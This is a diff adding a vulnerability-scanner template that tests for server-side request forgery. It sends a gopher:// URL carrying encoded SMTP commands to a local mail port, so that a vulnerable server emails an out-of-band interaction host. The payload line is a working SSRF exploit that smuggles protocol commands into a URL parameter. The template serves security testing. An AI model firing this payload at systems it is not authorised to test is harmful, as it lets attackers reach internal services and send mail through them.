@@ -1,0 +1,18 @@
+id: gopher-smtp-injection
+info:
+  name: SMTP SSRF Injection via Gopher
+  author: jakelo-ai
+  severity: medium
+  description: Exploit SSRF to interact with local SMTP and send an email to interactsh server.
+  tags: ssrf,gopher,smtp,oast,custom
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=gopher://127.0.0.1:25/_MAIL%20FROM%3Ahacker%40{{interactsh-url}}%0ARCPT%20To%3Avictim%40{{interactsh-url}}%0ADATA%0AFrom%3Ahacker%40{{interactsh-url}}%0ASubject%3A%20SSRF%20Test%0AMessage%3A%20Vulnerable%20to%20SSRF%0A."
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "smtp"
